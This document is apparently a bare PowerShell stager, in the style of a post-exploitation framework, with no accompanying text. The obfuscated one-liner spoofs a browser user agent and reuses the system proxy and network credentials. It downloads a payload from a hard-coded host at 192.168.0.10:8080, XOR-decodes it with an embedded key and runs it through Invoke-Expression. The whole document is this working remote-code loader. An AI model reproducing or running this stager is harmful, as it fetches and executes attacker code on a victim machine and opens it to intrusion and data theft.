
[SYsteM.Net.SErviCePoInTMaNaGER]::EXPECt100CoNtINue = 0;$Wc=NEW-OBjeCt SyStEM.NEt.WEbCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDErS.ADd('User-Agent',$u);$wC.Proxy = [SYSTEm.NEt.WeBREquEsT]::DeFaulTWEBPrOxy;$wc.PRoXy.CREDENTiALS = [SYsTEM.NET.CReDEntIALCAChE]::DEFAultNetWorkCReDENtIaLs;$K='c5114664d5cae6566f528cd9f789363c';$I=0;[ChAr[]]$B=([ChAr[]]($WC.DOWnLoadStRinG("http://192.168.0.10:8080/index.asp")))|%{$_-BXOR$K[$i++%$k.LENgTh]};IEX ($b-joIn'')

